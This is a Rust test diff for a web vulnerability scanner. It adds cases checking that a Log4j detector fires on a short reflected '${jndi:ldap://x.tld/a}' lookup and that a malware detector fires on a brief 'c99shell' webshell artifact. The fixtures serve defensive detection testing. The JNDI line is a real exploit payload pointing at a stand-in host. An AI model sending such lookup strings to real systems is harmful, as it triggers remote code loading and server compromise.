@@ -7512,6 +7512,19 @@ mod tests {
             fired_plugins(&real_exploit).contains("Log4JOpportunistic"),
             "log4j plugin must fire on a real $${{jndi:ldap://}} marker"
         );
+
+        // Real-world echo replies are often very short (a single header
+        // value reflected back on a 400). Rule must opt out of the 50-byte
+        // body floor via `min_body_bytes: 0`, otherwise it loses these.
+        let short_echo = super::run_external_detector_pack(
+            &document_with_status("/api/v1/login", "${jndi:ldap://x.tld/a}", 400),
+            &manifest,
+        )
+        .expect("log4j short echo run");
+        assert!(
+            fired_plugins(&short_echo).contains("Log4JOpportunistic"),
+            "log4j plugin must fire on a sub-50-byte $${{jndi:ldap://}} echo"
+        );
     }
 
     /// MalwareHttpPlugin used to fire on any page mentioning "malware" or
@@ -7548,6 +7561,18 @@ mod tests {
         assert!(
             fired_plugins(&real_webshell).contains("MalwareHttpPlugin"),
             "malware plugin must fire on a known c99shell artifact"
+        );
+
+        // Short artifact strings (e.g., a single banner or header echo) must
+        // still match — same opt-out shape as the log4j rule.
+        let short_artifact = super::run_external_detector_pack(
+            &document("/wp-content/uploads/x.php", "c99shell"),
+            &manifest,
+        )
+        .expect("short malware artifact run");
+        assert!(
+            fired_plugins(&short_artifact).contains("MalwareHttpPlugin"),
+            "malware plugin must fire on a sub-50-byte c99shell artifact"
         );
     }
 
